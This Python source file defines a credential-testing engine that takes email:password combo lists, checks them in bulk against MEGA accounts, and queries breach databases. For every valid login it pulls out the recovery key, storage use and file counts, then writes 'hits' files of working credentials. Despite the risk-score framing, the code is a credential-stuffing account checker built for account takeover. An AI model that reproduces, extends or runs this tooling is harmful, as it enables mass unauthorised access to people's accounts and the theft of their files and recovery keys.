"""
Unified Credential Testing Engine
Combines MEGA validation, breach detection, and account information extraction
"""

import logging
import asyncio
from typing import List, Dict, Optional, Callable, Tuple
from datetime import datetime
from pathlib import Path
import json

from .mega_authenticator import MegaAuthenticator, AccountResult
from .breach_detection import BreachDetectionService

logger = logging.getLogger(__name__)


class CredentialTester:
    """
    Complete credential testing system:
    1. Test email:password validity (MEGA/Gmail/Outlook)
    2. Find all breached passwords for each email
    3. Extract account information for valid credentials
    4. Calculate overall risk score
    """
    
    def __init__(self, max_threads: int = 100):
        self.mega_auth = MegaAuthenticator(max_threads=max_threads)
        self.breach_service = BreachDetectionService()
        
        self.stats = {
            'total_tested': 0,
            'valid_credentials': 0,
            'invalid_credentials': 0,
            'breached_emails': 0,
            'high_risk_accounts': 0,
            'data_extracted': 0
        }
        
        logger.info("✅ CredentialTester initialized")
    
    async def test_combos(self, combos: List[Tuple[str, str]], 
                         check_mega: bool = True,
                         check_breaches: bool = True,
                         progress_callback: Optional[Callable] = None) -> List[Dict]:
        """
        Test email:password combinations
        
        Args:
            combos: List of (email, password) tuples
            check_mega: Whether to validate MEGA accounts
            check_breaches: Whether to check breach databases
            progress_callback: Optional callback(stage, current, total, message)
            
        Returns:
            List of comprehensive test results
        """
        await self.breach_service.initialize()
        
        results = []
        total = len(combos)
        
        logger.info(f"🚀 Starting credential testing: {total} combos")
        
        # Stage 1: MEGA validation (if enabled)
        mega_results = {}
        if check_mega:
            if progress_callback:
                progress_callback('mega_validation', 0, total, 'Validating MEGA credentials...')
            
            accounts = [{'email': e, 'password': p} for e, p in combos]
            
            def mega_progress(checked, total_check, stats):
                if progress_callback:
                    progress_callback('mega_validation', checked, total, 
                                    f"Validated {checked}/{total_check} - {stats['hits']} hits")
            
            mega_check_results = self.mega_auth.check_accounts(accounts, mega_progress)
            
            # Index by email for easy lookup
            for result in mega_check_results:
                mega_results[result.email] = result
            
            logger.info(f"✅ MEGA validation complete: {len([r for r in mega_check_results if r.status == 'hit'])} valid accounts")
        
        # Stage 2: Breach detection (if enabled)
        if check_breaches:
            if progress_callback:
                progress_callback('breach_detection', 0, total, 'Checking breach databases...')
            
            for idx, (email, password) in enumerate(combos):
                try:
                    # Get email breach data
                    email_breaches = await self.breach_service.check_email_breaches(email)
                    
                    # Get password breach data
                    password_breaches = await self.breach_service.check_password_breach(password)
                    
                    # Get MEGA result if available
                    mega_result = mega_results.get(email)
                    
                    # Combine all results
                    combined_result = {
                        # Credential info
                        'email': email,
                        'password': password,
                        'timestamp': datetime.now().isoformat(),
                        
                        # MEGA validation results
                        'mega_valid': mega_result.status == 'hit' if mega_result else False,
                        'mega_account_type': mega_result.account_type if mega_result else None,
                        'mega_storage_gb': mega_result.total_gb if mega_result else 0,
                        'mega_used_gb': mega_result.used_gb if mega_result else 0,
                        'mega_files': mega_result.file_count if mega_result else 0,
                        'mega_folders': mega_result.folder_count if mega_result else 0,
                        'mega_recovery_key': mega_result.recovery_key if mega_result else None,
                        'mega_user_info': mega_result.user_info if mega_result else None,
                        
                        # Email breach results
                        'email_breached': email_breaches['breached'],
                        'breach_count': email_breaches['breach_count'],
                        'breaches': email_breaches['breaches'],
                        'paste_count': email_breaches['paste_count'],
                        'pastes': email_breaches['pastes'],
                        'data_exposed': email_breaches['data_exposed'],
                        
                        # Password breach results
                        'password_breached': password_breaches['breached'],
                        'password_seen_count': password_breaches['times_seen'],
                        'password_risk_level': password_breaches['risk_level'],
                        
                        # Overall risk assessment
                        'overall_risk_score': self._calculate_overall_risk(
                            mega_result, email_breaches, password_breaches
                        ),
                        'overall_risk_level': self._get_risk_level(
                            mega_result, email_breaches, password_breaches
                        )
                    }
                    
                    results.append(combined_result)
                    
                    # Update stats
                    self.stats['total_tested'] += 1
                    if combined_result['mega_valid']:
                        self.stats['valid_credentials'] += 1
                        if mega_result and mega_result.file_count > 0:
                            self.stats['data_extracted'] += 1
                    else:
                        self.stats['invalid_credentials'] += 1
                    
                    if combined_result['email_breached']:
                        self.stats['breached_emails'] += 1
                    
                    if combined_result['overall_risk_level'] in ['HIGH', 'CRITICAL']:
                        self.stats['high_risk_accounts'] += 1
                    
                    # Progress callback
                    if progress_callback:
                        progress_callback('breach_detection', idx + 1, total,
                                        f"Checked {idx + 1}/{total} - {self.stats['valid_credentials']} valid")
                
                except Exception as e:
                    logger.error(f"Error testing {email}:{password}: {e}")
                    results.append({
                        'email': email,
                        'password': password,
                        'error': str(e),
                        'timestamp': datetime.now().isoformat()
                    })
        
        await self.breach_service.close()
        
        logger.info(f"✅ Credential testing complete: {self.stats}")
        return results
    
    def _calculate_overall_risk(self, mega_result: Optional[AccountResult], 
                                email_breaches: Dict, password_breaches: Dict) -> int:
        """
        Calculate overall risk score (0-100)
        
        Factors:
        - Account validity (valid account = higher risk)
        - Email breach history
        - Password breach frequency
        - Data exposure types
        - Account value (storage, files)
        """
        score = 0
        
        # Valid account adds risk (someone could access it)
        if mega_result and mega_result.status == 'hit':
            score += 20
            
            # Pro account with data = higher value target
            if mega_result.account_type == 'PRO':
                score += 10
            
            if mega_result.file_count > 100:
                score += 10
            
            if mega_result.used_gb > 10:
                score += 10
        
        # Email breaches
        score += min(email_breaches.get('breach_count', 0) * 3, 20)
        
        # Password breaches
        if password_breaches['breached']:
            times_seen = password_breaches['times_seen']
            if times_seen > 10000:
                score += 30
            elif times_seen > 1000:
                score += 20
            elif times_seen > 100:
                score += 10
            else:
                score += 5
        
        return min(score, 100)
    
    def _get_risk_level(self, mega_result: Optional[AccountResult],
                       email_breaches: Dict, password_breaches: Dict) -> str:
        """Get human-readable risk level"""
        score = self._calculate_overall_risk(mega_result, email_breaches, password_breaches)
        
        if score >= 80:
            return 'CRITICAL'
        elif score >= 60:
            return 'HIGH'
        elif score >= 30:
            return 'MEDIUM'
        else:
            return 'LOW'
    
    def save_results(self, results: List[Dict], output_dir: Path):
        """
        Save results in multiple formats
        
        Saves:
        - hits.txt: Valid credentials only
        - breached.txt: Emails found in breaches
        - high_risk.txt: High-risk accounts
        - full_report.json: Complete detailed results
        """
        output_dir = Path(output_dir)
        output_dir.mkdir(parents=True, exist_ok=True)
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Valid credentials (hits)
        hits = [r for r in results if r.get('mega_valid')]
        if hits:
            hits_file = output_dir / f'hits_{timestamp}.txt'
            with open(hits_file, 'w', encoding='utf-8') as f:
                for hit in hits:
                    f.write(f"\n{'='*60}\n")
                    f.write(f"🎯 VALID ACCOUNT FOUND\n")
                    f.write(f"{'='*60}\n")
                    f.write(f"📧 Email: {hit['email']}\n")
                    f.write(f"🔑 Password: {hit['password']}\n")
                    f.write(f"🛡️  Recovery Key: {hit.get('mega_recovery_key', 'N/A')}\n\n")
                    f.write(f"📊 ACCOUNT DETAILS:\n")
                    f.write(f"├── Type: {hit['mega_account_type']}\n")
                    f.write(f"├── Total Storage: {hit['mega_storage_gb']} GB\n")
                    f.write(f"├── Used Storage: {hit['mega_used_gb']} GB\n")
                    f.write(f"├── Files: {hit['mega_files']}\n")
                    f.write(f"└── Folders: {hit['mega_folders']}\n\n")
                    f.write(f"🔥 BREACH STATUS:\n")
                    f.write(f"├── Email Breaches: {hit['breach_count']}\n")
                    f.write(f"├── Password Seen: {hit['password_seen_count']} times\n")
                    f.write(f"├── Risk Level: {hit['overall_risk_level']}\n")
                    f.write(f"└── Risk Score: {hit['overall_risk_score']}/100\n")
            
            logger.info(f"💾 Saved {len(hits)} hits to {hits_file}")
        
        # Breached emails
        breached = [r for r in results if r.get('email_breached')]
        if breached:
            breached_file = output_dir / f'breached_{timestamp}.txt'
            with open(breached_file, 'w', encoding='utf-8') as f:
                for breach in breached:
                    f.write(f"{breach['email']}:{breach['password']} | ")
                    f.write(f"Breaches: {breach['breach_count']} | ")
                    f.write(f"Password seen: {breach['password_seen_count']} times\n")
            
            logger.info(f"💾 Saved {len(breached)} breached emails to {breached_file}")
        
        # High risk accounts
        high_risk = [r for r in results if r.get('overall_risk_level') in ['HIGH', 'CRITICAL']]
        if high_risk:
            risk_file = output_dir / f'high_risk_{timestamp}.txt'
            with open(risk_file, 'w', encoding='utf-8') as f:
                for risk in high_risk:
                    f.write(f"{risk['email']}:{risk['password']} | ")
                    f.write(f"Risk: {risk['overall_risk_level']} ({risk['overall_risk_score']}/100) | ")
                    f.write(f"Valid: {risk.get('mega_valid', False)}\n")
            
            logger.info(f"💾 Saved {len(high_risk)} high-risk accounts to {risk_file}")
        
        # Full JSON report
        report_file = output_dir / f'full_report_{timestamp}.json'
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump({
                'timestamp': timestamp,
                'stats': self.stats,
                'results': results
            }, f, indent=2, default=str)
        
        logger.info(f"💾 Saved full report to {report_file}")
        
        return {
            'hits_file': hits_file if hits else None,
            'breached_file': breached_file if breached else None,
            'risk_file': risk_file if high_risk else None,
            'report_file': report_file
        }
    
    def get_stats(self) -> Dict:
        """Get current statistics"""
        return self.stats.copy()
